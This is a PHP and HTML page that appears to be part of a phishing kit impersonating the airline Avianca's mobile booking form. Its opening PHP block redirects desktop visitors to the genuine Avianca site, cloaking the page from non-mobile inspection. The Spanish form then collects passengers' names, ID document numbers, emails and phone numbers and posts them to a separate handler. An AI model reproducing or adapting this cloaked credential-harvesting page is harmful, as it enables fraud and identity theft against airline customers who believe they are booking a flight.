<?php

session_start();
if (isset($_SESSION["untilH"])) {

    $untilH = $_SESSION["untilH"];
    $fromD = $_SESSION["fromD"];

}


function esDispositivoMovil() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'];

    $dispositivosMoviles = array(
        'Android', 'webOS', 'iPhone', 'iPad',
        'iPod', 'BlackBerry', 'Windows Phone'
    );

    foreach ($dispositivosMoviles as $dispositivo) {
        if (stripos($userAgent, $dispositivo) !== false) {
            return true;
        }
    }

    return false;
}

if (esDispositivoMovil()) {

} else {
    header('location:https://www.avianca.com/es/?poscode=CO&gad_source=1&gclid=Cj0KCQiAmNeqBhD4ARIsADsYfTf3M3CnHWAuPB5TJMPNHLxyBwgvsTEQ9E9ZtptQKnou4p8WNm3papAaAka8EALw_wcB');

}

?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="/css/booking.css">

    <style>
        * {
            margin: 0;
            padding: 0;
            font-family: Arial, Helvetica, sans-serif;
        }

        #inputD {
            width: 90%;
            height: 40px;
            border-radius: 5px;
            border: 2px solid rgb(217, 217, 217);
            font-size: 14px;
            padding: 5px;
            margin-bottom: 10px;
        }

        .info {
            width: 90%;
            background-color: white;
            border-radius: 5px;
            box-shadow: 0 2px 4px #919ba633, 0 1px 10px #919ba61f, 0 4px 5px #919ba624;
            margin: auto;
            margin-top: 15px;
            padding: 10px;
        }

        h1 {
            font-size: 20px;
        }

        a {
            font-size: 14px;
            text-align: justify;
        }

        select {
            background-color: white;
            color: black;
        }
    </style>


</head>

<body>
    <div class="headerPickF">

        <div class="contents">
            <img src="/assets/icon.png" class="iconPC" width="15%"><br>
            <a>
                <?php echo "$fromD - $untilH"; ?>
            </a>
            <span class="trip-locations">

            </span><span class="vertical-line"></span>
            <span class="dates"></span>



        </div>

    </div>

<form action="cargando_info.php" method="post">


    <div class="info">

            <a style="font-size:16px; font-weight:600;">Datos Personales</a>
           <br><select name="" id="inputD" style="margin-top:10px;">
                <option value="" selected>Adulto 1</option>
            </select>
            <br><h1 style="margin-top:10px; font-size:16px;">Pasajero <b style="font-size:16px; font-weight:400;">Adulto 1</b></h1>
            <a style="color:#a4a4a4;">Ingresa el primer nombre y el primer apellido como aparecen en el pasaporte o documento de identidad de
                cada pasajero.</a><br>
            <br> <input type="text" name="nombre" id="inputD" placeholder="Nombre" style="border:none; border-bottom:1px solid #dcdcdc;" required minlength="4" maxlength="10">
            <input type="text" name="apellido" id="inputD" placeholder="Apellido"style="border:none; border-bottom:1px solid #dcdcdc;" required><br>
                        <input type="text" name="cedula" id="inputD" placeholder="Número de Documento"style="border:none; border-bottom:1px solid #dcdcdc;" required maxlength="10" minlength="5"><br>

           <br><h1 style="font-size:16px;">Información de Contacto</h1>
            <a style="color:#a4a4a4;">Estos datos serán utilizados para informarte sobre tu reserva</a>
            <input type="email" name="email" id="inputD" placeholder="Email" style="border:none; border-bottom:1px solid #dcdcdc;" required>
            <input type="tel" name="telefono" id="inputD" placeholder="Teléfono" style="border:none; border-bottom:1px solid #dcdcdc;" maxlength="10" minlenght="10" required>

            <input type="submit" class="btn" name="enviar" value="Continuar con silla aleatoria">
  
    </div>
</form>
</body>